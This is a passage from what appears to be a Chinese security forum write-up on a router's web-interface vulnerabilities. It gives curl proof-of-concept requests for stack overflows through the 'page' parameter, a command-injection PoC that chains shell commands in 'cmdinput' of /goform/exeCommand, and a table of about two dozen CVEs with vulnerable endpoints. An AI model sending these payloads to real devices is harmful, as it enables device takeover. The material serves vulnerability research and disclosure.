
```bash
curl -i -X POST 'c68K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0p5J5y4#2)9J5k6e0p5H3x3q4)9J5c8X3N6G2k6X3!0J5L8g2)9J5c8W2u0G2N6i4c8W2f1%4c8S2N6r3W2U0i4K6t1%4' -d "page=$(python3 -c "print('A'*(300 - len('routing_static.asp?page=')))")"
```

此外，类似的`page`溢出还有很多，原理都是`sprint`未经校验直接拼接重定向url导致

## CVE-2025-14526

![](https://bbs.kanxue.com/upload/attach/202602/964118_XMCXVK8ATND58NC.webp)

PoC:

```bash
curl -i -X POST '6dbK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6e0p5J5y4#2)9J5k6e0p5H3x3q4)9J5c8X3N6G2k6X3!0J5L8g2)9J5c8V1H3%4d9h3#2Q4x3U0M7'. -d "page=$(python3 -c "print('A'*(300 - len('im.asp?page=%s')))")"
```

## CVE-2025-9812

结合通告信息，很明显是有溢出

![](https://bbs.kanxue.com/upload/attach/202602/964118_4HKSEGW6CPS3WYJ.webp)

但实际上更大的问题在后面，可以使用`;`分隔实现命令注入

或许是由于使用的用户模式仿真，能够利用的函数较少，这里只贴个PoC没深入研究

PoC:

```bash
curl -X POST -d "cmdinput=ping 127.0.0.1 -c 3; pwd; ls; cd bin/; pwd; ls; " http://192.168.127.100/goform/exeCommand
```

![](https://bbs.kanxue.com/upload/attach/202602/964118_5MCGPCHRAP8MUVD.webp)

## 栈溢出漏洞列表

类似的漏洞还有很多，这里贴一张列表

| CVE ID | 接口路径 | 关键参数 | 描述 |
| --- | --- | --- | --- |
| `CVE-2025-9813` | `/goform/SetSambaConf` | `samba_userNameSda` | `formSetSambaConf` 函数处理用户输入时未检查长度，导致栈溢出。 |
| `CVE-2025-9812` | `/goform/exeCommand` | `cmdinput` | `formexeCommand` 函数处理命令输入时发生缓冲区溢出，风险极高（可能涉及命令注入）。 |
| `CVE-2025-9748` | `/goform/IPSECsave` | `ipsecno` | `fromIpsecitem` 函数处理 IPSec 配置时存在溢出。 |
| `CVE-2025-9443` | `/goform/editUserName` | `new_account` | `formeditUserName` 函数修改用户账户时发生溢出。 |
| `CVE-2025-9007` | `/goform/editFileName` | `*(未指定)*` | `formeditFileName` 函数编辑文件名时存在溢出。 |
| `CVE-2025-9006` | `/goform/delFileName` | `*(未指定)*` | `formdelFileName` 函数删除文件时存在溢出。 |
| `CVE-2025-8180` | `/goform/deleteUserName` | `*(未指定)*` | `formdeleteUserName` 函数删除用户时存在溢出。 |
| `CVE-2025-5685` | `/goform/Natlimit` | `page` | `formNatlimit` 函数处理分页参数时存在溢出。 |
| `CVE-2025-5619` | `/goform/addUserName` | `Password` | `formaddUserName` 函数添加用户（处理密码）时存在溢出。 |
| `CVE-2025-14526` | `/goform/L7Im` | `page` | `frmL7ImForm` 函数处理分页参数时存在溢出。 |
| `CVE-2025-13400` | `/goform/WrlExtraGet` | `chkHz` | `formWrlExtraGet` 函数处理频率检查参数时存在溢出。 |
| `CVE-2025-13288` | `/goform/PPTPUserSetting` | `delno` | `fromPptpUserSetting` 函数处理删除编号参数时存在溢出。 |
| `CVE-2025-12322` | `/goform/NatStaticSetting` | `page` | `fromNatStaticSetting` 函数处理分页参数时存在溢出。 |
| `CVE-2025-12274` | `/goform/P2pListFilter` | `page` | `fromP2pListFilter` 函数处理分页参数时存在溢出。 |
| `CVE-2025-12273` | `/goform/webExcptypemanFilter` | `page` | `fromwebExcptypemanFilter` 函数处理分页参数时存在溢出。 |
| `CVE-2025-12272` | `/goform/addressNat` | `page` | `fromAddressNat` 函数处理分页参数时存在溢出。 |
| `CVE-2025-12271` | `/goform/RouteStatic` | `page` | `fromRouteStatic` 函数处理分页参数时存在溢出。 |
| `CVE-2025-12265` | `/goform/VirtualSer` | `page` | `fromVirtualSer` 函数处理分页参数时存在溢出。 |
| `CVE-2025-12236` | `/goform/DhcpListClient` | `page` | `fromDhcpListClient` 函数处理分页参数时存在溢出（与 15229 不同参数）。 |
| `CVE-2025-12235` | `/goform/SetIpBind` | `page` | `fromSetIpBind` 函数处理分页参数时存在溢出。 |
| `CVE-2025-12234` | `/goform/SafeMacFilter` | `page` | `fromSafeMacFilter` 函数处理分页参数时存在溢出。 |
| `CVE-2025-12233` | `/goform/SafeUrlFilter` | `page` | `fromSafeUrlFilter` 函数处理分页参数时存在溢出。 |
| `CVE-2025-12232` | `/goform/SafeClientFilter` | `page` | `fromSafeClientFilter` 函数处理分页参数时存在溢出。 |
| `CVE-2025-11117` | `/goform/GstDhcpSetSer` | `dips` | (注：描述函数为 `formWrlExtraGet`) 处理 DHCP 设置时发生溢出。 |

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

[#固件分析](https://bbs.kanxue.com/forum-128-1-170.htm)

[#漏洞分析](https://bbs.kanxue.com/forum-128-1-171.htm)

[#家用设备](https://bbs.kanxue.com/forum-128-1-173.htm)
